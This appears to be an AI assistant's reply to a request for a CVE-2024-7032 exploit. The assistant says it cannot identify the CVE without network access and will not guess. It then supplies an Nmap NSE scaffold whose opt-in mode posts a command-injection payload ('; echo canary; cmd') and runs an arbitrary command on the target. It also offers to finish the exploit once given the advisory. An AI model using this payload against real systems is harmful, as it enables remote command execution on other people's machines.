@@ -1,0 +1,105 @@
+I checked the workspace for any reference to CVE-2024-7032 or the target — nothing local describes it, and this sandbox has no network access, so I can't pull the NVD/vendor advisory from here either.
+
+Here's the honest constraint: I can't reliably identify CVE-2024-7032's affected product or its exploit mechanics from memory, and I won't guess. An "exact" exploit script written on an unverified assumption would just be a wrong script with confident formatting. The 2024-70xx numbering block contains several unrelated IoT/web CVEs, and I don't have evidence pinning this one down.
+
+What I need to give you the exact script (any one of these):
+- The advisory text or affected product + version
+- The open service/banner on the authorized box (e.g., `nmap -sV` output)
+- The vulnerable endpoint or parameter, if you already know it
+
+Meanwhile, here's a correct NSE exploit scaffold built on the standard `vulns` library pattern. It defaults to a non-destructive check and only fires the payload when you pass `exploit=true`. The marked placeholders are exactly the four facts the advisory would pin down — fill those in and it's the finished script:
+
+```lua
+local http = require "http"
+local nmap = require "nmap"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+local string = require "string"
+local vulns = require "vulns"
+
+description = [[
+Exploits CVE-2024-7032 (<AFFECTED PRODUCT/SERVICE>).
+
+TODO: describe the vector once confirmed from the advisory:
+endpoint, parameter, injection type, and expected response.
+
+Default mode is a safe version/exposure check. Live exploitation
+requires --script-args exploit=true.
+]]
+
+author = "<you>"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+categories = {"vuln", "exploit", "intrusive"}
+
+-- TODO: constrain to the actual service/port once known
+portrule = shortport.http
+
+dependencies = {}
+
+---
+-- @args exploit     Set to "true" to actually send the payload. Default: check only.
+-- @args uri         Vulnerable endpoint path. Default: <ENDPOINT>
+-- @args cmd         Command to execute in exploit mode. Default: id
+---
+
+action = function(host, port)
+  local vuln = {
+    title = "CVE-2024-7032 <SHORT TITLE>",
+    state = vulns.STATE.NOT_VULN,
+    IDS = { CVE = "CVE-2024-7032" },
+    risk_factor = "High",
+    description = [[
+<TODO: one-paragraph description from the advisory.>
+    ]],
+    references = {
+      "<TODO: advisory URL>",
+    },
+    dates = {
+      disclosure = { year = "2024", month = "<TODO>", day = "<TODO>" },
+    },
+  }
+
+  local report = vulns.Report:new(SCRIPT_NAME, host, port)
+  local exploit_mode = stdnse.get_script_args(SCRIPT_NAME .. ".exploit") == "true"
+  local uri = stdnse.get_script_args(SCRIPT_NAME .. ".uri") or "<ENDPOINT>"
+
+  -- Step 1: confirm the target is the affected product/version.
+  -- TODO: replace with the real fingerprint (banner, page marker, version string).
+  local probe = http.get(host, port, uri)
+  if not probe or not probe.status then
+    stdnse.debug1("No response from %s", uri)
+    return report:make_output(vuln)
+  end
+
+  if not (probe.body and probe.body:match("<VERSION/BANNER MARKER>")) then
+    stdnse.debug1("Target does not match affected fingerprint")
+    return report:make_output(vuln)
+  end
+
+  vuln.state = vulns.STATE.LIKELY_VULN
+
+  -- Step 2 (opt-in): send the exploit and verify with a canary.
+  -- TODO: build the real request: method, parameter, encoding, payload.
+  if exploit_mode then
+    local cmd = stdnse.get_script_args(SCRIPT_NAME .. ".cmd") or "id"
+    local canary = stdnse.generate_random_string(8)
+
+    -- Example shape for HTTP command injection; adjust to the real vector:
+    local payload = ("; echo %s; %s"):format(canary, cmd)
+    local opts = { header = { ["Content-Type"] = "application/x-www-form-urlencoded" } }
+    local body = ("<PARAM>=%s"):format(payload) -- TODO: real parameter name
+    local res = http.post(host, port, uri, opts, nil, body)
+
+    if res and res.status and res.body and res.body:find(canary, 1, true) then
+      vuln.state = vulns.STATE.EXPLOITED
+      vuln.exploit_results = res.body
+    end
+  end
+
+  return report:make_output(vuln)
+end
+```
+
+Run it as: `nmap -p <port> --script=cve-2024-7032 <target>` for the check, plus `--script-args exploit=true,cmd=id` for the live test.
+
+Paste the advisory or the box's service banner and I'll pin down the endpoint, parameter, payload encoding, and verification so the script is exact rather than scaffolded.
